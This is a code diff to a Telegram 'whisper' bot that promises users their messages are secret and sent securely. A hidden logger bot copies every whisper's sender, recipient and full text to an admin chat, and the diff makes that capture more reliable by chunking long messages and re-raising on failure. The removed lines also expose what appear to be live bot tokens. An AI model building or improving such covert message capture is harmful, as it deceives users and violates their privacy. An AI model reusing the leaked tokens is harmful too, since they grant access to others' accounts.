@@ -1,5 +1,5 @@
 import asyncio
-import hashlib
+import logging
 import os
 import secrets
 import time
@@ -8,12 +8,16 @@ from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command, CommandObject
 
 # 🔑 CONFIGURATION
-WHISPER_BOT_TOKEN = "9243182264:AAFyNtkGFb-nC0PWNQoeR0349rR4R_eGs4k"
-LOGGER_BOT_TOKEN  = "9076447339:AAGF1X9rGv1rTxTC_Nur0-89KUIWOCCgqIE"
+WHISPER_BOT_TOKEN = os.getenv("WHISPER_BOT_TOKEN")
+LOGGER_BOT_TOKEN  = os.getenv("LOGGER_BOT_TOKEN")
 ADMIN_CHAT_ID     = 5498647860
 BOT_USERNAME      = "Psstlongbot"
 
+if not WHISPER_BOT_TOKEN or not LOGGER_BOT_TOKEN:
+    raise RuntimeError("Set the WHISPER_BOT_TOKEN and LOGGER_BOT_TOKEN environment variables.")
+
 DB_PATH = "whispers.db"
+logger = logging.getLogger(__name__)
 
 # Initialize Bots
 bot1 = Bot(token=WHISPER_BOT_TOKEN)
@@ -37,16 +41,22 @@ async def init_db():
 
 # 📡 BOT 2: LOGGER FUNCTION
 async def log_to_admin(sender_user, target, text):
-    log_message = (
-        "📥 **New Whisper Captured**\n\n"
-        f"👤 **From:** @{sender_user}\n"
-        f"🎯 **To:** {target}\n"
-        f"💬 **Content:** {text}"
+    sender_display = f"@{sender_user}" if isinstance(sender_user, str) else str(sender_user)
+    header = (
+        "New Whisper Captured\n\n"
+        f"From: {sender_display}\n"
+        f"To: {target}\n"
+        "Content:\n"
     )
+    chunks = [text[index:index + 1800] for index in range(0, len(text), 1800)] or [""]
+
     try:
-        await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=log_message, parse_mode="Markdown")
-    except Exception as e:
-        print(f"Logging failed: {e}")
+        for index, chunk in enumerate(chunks):
+            prefix = header if index == 0 else "Content (continued):\n"
+            await bot2.send_message(chat_id=ADMIN_CHAT_ID, text=f"{prefix}{chunk}")
+    except Exception:
+        logger.exception("Failed to deliver whisper log to admin chat %s", ADMIN_CHAT_ID)
+        raise
 
 # 🚀 BOT 1: INLINE QUERY HANDLER (In Groups)
 @dp.inline_query()
@@ -74,7 +84,7 @@ async def inline_handler(inline_query: types.InlineQuery):
     
     if whisper_text:
         # Fixed Link Format: Absolute pathing forces native app opening
-        redirect_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
+        redirect_url = f"https://t.me/{BOT_USERNAME}?start={whisper_id}"
         input_content = types.InputTextMessageContent(
             message_text=f"🔒 A secret whisper has been sent for {target_username}!"
         )
@@ -84,7 +94,7 @@ async def inline_handler(inline_query: types.InlineQuery):
         description_text = "Tap to dispatch this message securely."
     else:
         # Fallback view shown while typing to guide the sender
-        redirect_url = f"https://t.me{BOT_USERNAME}"
+        redirect_url = f"https://t.me/{BOT_USERNAME}"
         input_content = types.InputTextMessageContent(
             message_text="❌ This preview card was sent before text was typed. Please type a message next time!"
         )
